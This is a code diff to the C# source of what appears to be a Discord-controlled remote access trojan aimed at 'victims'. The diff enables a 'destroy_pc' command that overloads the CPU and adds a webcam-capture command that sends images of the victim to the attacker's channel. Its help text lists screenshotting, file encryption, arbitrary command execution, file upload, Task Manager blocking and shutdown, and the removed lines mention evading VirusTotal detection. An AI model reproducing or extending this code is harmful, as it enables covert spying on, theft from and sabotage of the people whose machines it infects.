@@ -252,20 +252,20 @@ class Program
             await HandleUploadCommand(userMessage, args[1], args[2]);
         }
 
-        //if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
-        //{
-        //    await HandleDestroyPCCommand(userMessage);
-        //}
+        if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleDestroyPCCommand(userMessage);
+        }
 
         //if (command == Settings.prefix + "!modinstall" && userMessage.Channel.Id == victimChannel.Id)
         //{
         //    await HandleModinstallCommand(userMessage, args[1]);
         //}
 
-        //if (command == Settings.prefix + "camera" && userMessage.Channel.Id == victimChannel.Id)
-        //{
-        //    await HandleCameraCommand(userMessage);
-        //}
+        if (command == Settings.prefix + "webcam" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleWebCamCommand(userMessage);
+        }
     }
 
     private async Task HandleHelpCommand(SocketUserMessage userMessage)
@@ -283,29 +283,33 @@ Commands below works only in victim channel
 {Settings.prefix}press [button]
 {Settings.prefix}type [text without spaces]
 {Settings.prefix}web [link without spaces]
-{Settings.prefix}screen [width] [height] [[Default is 1920x1080]]
+{Settings.prefix}screen [width] [height] [[Default is 1920x1080]] - Screenshot of victim's screen
+{Settings.prefix}webcam - takes a webcam shot
 {Settings.prefix}encrypt [path]
 {Settings.prefix}decrypt [path]
 {Settings.prefix}getprocesslist
 {Settings.prefix}killprocess [pid]
 {Settings.prefix}filesystem [action] [path]
 {Settings.prefix}cmd [command]
-{Settings.prefix}destroy_pc - Moved to Modules for make less detections on VTotal
+{Settings.prefix}destroy_pc - Makes 160% of CPU
 {Settings.prefix}upload [path] [url] - Uploads file to specific path
-{Settings.prefix}modinstall [raw_link_to_file] - Install and run modification
 {Settings.prefix}msgbox [text] [caption] - show message box
 {Settings.prefix}control [block] - Blocks Taskmgr
 {Settings.prefix}boot - Shutdown the PC
 {Settings.prefix}reboot - Restart the PC
 {Settings.prefix}stop - Stop
--------------------------------------------
-Modules
--------------------------------------------
-https://raw.githubusercontent.com/avirt1274/XRatModifications/refs/heads/main/destroy_pc.cs - Makes the 90% CPU
-
-https://raw.githubusercontent.com/avirt1274/XRatModifications/refs/heads/main/test.cs - Test script
--------------------------------------------
 ");
+    }
+
+    private async Task HandleDestroyPCCommand(SocketUserMessage userMessage)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+        Utils.DestroyPC();
+
+        await logsChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
     }
 
     private async Task HandleModinstallCommand(SocketUserMessage userMessage, string link)
@@ -430,6 +434,30 @@ https://raw.githubusercontent.com/avirt1274/XRatModifications/refs/heads/main/te
             File.Delete(file); // Then deleting screenshot
 
             await logsChannel.SendMessageAsync($"Successfully getted a screenshot of victim '{victimId}' | {userMessage.Author.Mention}");
+        }
+        catch (Exception e)
+        {
+            if (Settings.debug)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+    }
+
+    private async Task HandleWebCamCommand(SocketUserMessage userMessage)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+        try
+        {
+            string file = await Utils.WebCamAsync();
+
+            await victimChannel.SendFileAsync(file);
+
+            File.Delete(file); // Then deleting screenshot
+
+            await logsChannel.SendMessageAsync($"Successfully getted a webcam of victim '{victimId}' | {userMessage.Author.Mention}");
         }
         catch (Exception e)
         {
